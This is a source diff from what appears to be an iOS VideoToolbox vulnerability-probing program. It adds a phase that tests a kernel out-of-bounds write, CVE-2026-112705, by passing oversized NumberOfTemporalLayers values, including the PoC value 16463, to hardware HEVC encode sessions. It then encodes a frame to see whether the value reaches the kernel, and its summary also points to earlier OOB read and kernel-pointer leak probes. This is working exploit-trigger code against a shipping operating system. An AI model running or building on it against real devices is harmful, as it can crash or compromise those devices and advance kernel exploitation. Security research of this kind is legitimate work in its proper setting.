@@ -25117,10 +25117,141 @@ new_modes:
                 rlog("  Timing anomalies at n>2 → kernel log overhead from OOB reads\n");
             }
 
+            /* ---- 22g: CVE-2026-112705 — Large NumberOfTemporalLayers OOB Write ---- */
+            rlog("\n--- 22g: CVE-2026-112705 NumberOfTemporalLayers OOB Write probe ---\n");
+            rlog("Public PoC: TL=16463 causes kernel panic on iOS 27.0.1\n");
+            rlog("Fix in 27.2: clamps to 0-7. Testing acceptance on 27.1...\n\n");
+            {
+                /* Test which NumberOfTemporalLayers values VT accepts.
+                 * Phase 22d tested 1-8 (all accepted). Now test larger
+                 * values to see if VT passes them to the kernel.
+                 * WARNING: values that reach the kernel OOB write path
+                 * may crash the device. We test SET only first. */
+                int tl_test[] = {
+                    9, 10, 16, 32, 64, 128, 255, 256, 512,
+                    1024, 4096, 8192, 16000, 16462, 16463, 16464,
+                    32768, 65535, 0, -1
+                };
+                int ntests = sizeof(tl_test) / sizeof(tl_test[0]);
+
+                rlog("  --- Step 1: Property acceptance (no encode) ---\n");
+                for (int ti = 0; ti < ntests; ti++) {
+                    int tl = tl_test[ti];
+                    VTCompressionSessionRef s22g = NULL;
+                    CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(es,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    OSStatus cr = VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 640, 480,
+                        kCMVideoCodecType_HEVC, es, NULL, NULL,
+                        NULL, NULL, &s22g);
+                    CFRelease(es);
+                    if (cr != noErr || !s22g) {
+                        rlog("  TL=%d: session fail (%d)\n", tl, (int)cr);
+                        continue;
+                    }
+
+                    CFNumberRef tln = CFNumberCreate(NULL, kCFNumberIntType, &tl);
+                    OSStatus ss = VTSessionSetProperty(s22g,
+                        CFSTR("NumberOfTemporalLayers"), tln);
+                    CFRelease(tln);
+
+                    /* Readback */
+                    CFTypeRef rv = NULL;
+                    OSStatus rs = VTSessionCopyProperty(s22g,
+                        CFSTR("NumberOfTemporalLayers"), NULL, &rv);
+                    int rb_val = -1;
+                    if (rs == noErr && rv &&
+                        CFGetTypeID(rv) == CFNumberGetTypeID()) {
+                        CFNumberGetValue(rv, kCFNumberIntType, &rb_val);
+                    }
+                    if (rv) CFRelease(rv);
+
+                    rlog("  TL=%d: set=%d readback=%d%s\n",
+                        tl, (int)ss, rb_val,
+                        (ss == 0 && tl > 8) ? " *** ACCEPTED > 8 ***" : "");
+
+                    VTCompressionSessionInvalidate(s22g);
+                    CFRelease(s22g);
+                }
+
+                /* Step 2: For values that VT accepts AND are > 8,
+                 * test if PrepareToEncodeFrames succeeds.
+                 * This is where the value may reach the kernel. */
+                rlog("\n  --- Step 2: Prepare + single encode for accepted TL > 8 ---\n");
+                rlog("  WARNING: This may trigger kernel OOB write!\n");
+                int tl_encode_test[] = {9, 10, 16, 32, 64, 128, 255};
+                int ne = sizeof(tl_encode_test) / sizeof(tl_encode_test[0]);
+
+                for (int ti = 0; ti < ne; ti++) {
+                    int tl = tl_encode_test[ti];
+                    VTCompressionSessionRef s22ge = NULL;
+                    CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(es,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 640, 480,
+                        kCMVideoCodecType_HEVC, es, NULL, NULL,
+                        encode_cb, NULL, &s22ge);
+                    CFRelease(es);
+                    if (!s22ge) continue;
+
+                    /* Set properties */
+                    VTSessionSetProperty(s22ge,
+                        CFSTR("RealTime"), kCFBooleanTrue);
+                    VTSessionSetProperty(s22ge,
+                        CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+                    VTSessionSetProperty(s22ge,
+                        CFSTR("EnableMCTF"), kCFBooleanTrue);
+                    CFNumberRef tln = CFNumberCreate(NULL, kCFNumberIntType, &tl);
+                    OSStatus ss = VTSessionSetProperty(s22ge,
+                        CFSTR("NumberOfTemporalLayers"), tln);
+                    CFRelease(tln);
+
+                    if (ss != noErr) {
+                        rlog("  TL=%d: set rejected (%d), skip\n", tl, (int)ss);
+                        VTCompressionSessionInvalidate(s22ge);
+                        CFRelease(s22ge);
+                        continue;
+                    }
+
+                    OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s22ge);
+                    rlog("  TL=%d: Prepare=%d", tl, (int)pr);
+
+                    if (pr == noErr) {
+                        /* Encode ONE frame only — if kernel OOB fires,
+                         * we either crash or get interesting behavior */
+                        g_encode_done = 0;
+                        g_cb_status = -999;
+                        encode_one(s22ge, 0, 640, 480);
+                        for (int w = 0; w < 300 && !g_encode_done; w++)
+                            usleep(10000);
+                        rlog(" encode=%d cb=%d%s\n",
+                            g_encode_done, (int)g_cb_status,
+                            g_cb_status == noErr ?
+                                " *** KERNEL ACCEPTED ***" : "");
+                    } else {
+                        rlog(" (skipping encode)\n");
+                    }
+
+                    VTCompressionSessionCompleteFrames(s22ge, kCMTimeInvalid);
+                    VTCompressionSessionInvalidate(s22ge);
+                    CFRelease(s22ge);
+                }
+            }
+
             rlog("\n=== Phase 22 Summary ===\n");
-            rlog("Check output for MCTF-related properties and KPTR leaks.\n");
-            rlog("22f is the KEY test: MCTFStrengthLevel as CFArray triggers the\n");
-            rlog("MCTF OOB read counter at session+0x8a8 (CVE-2026-112466).\n");
+            rlog("22f: MCTFStrengthLevel CFArray — tests MCTF OOB counter.\n");
+            rlog("22g: Large NumberOfTemporalLayers — tests CVE-2026-112705 OOB write.\n");
+            rlog("Look for *** ACCEPTED > 8 *** and *** KERNEL ACCEPTED ***.\n");
             rlog("--- Phase 22 complete ---\n");
         }
 
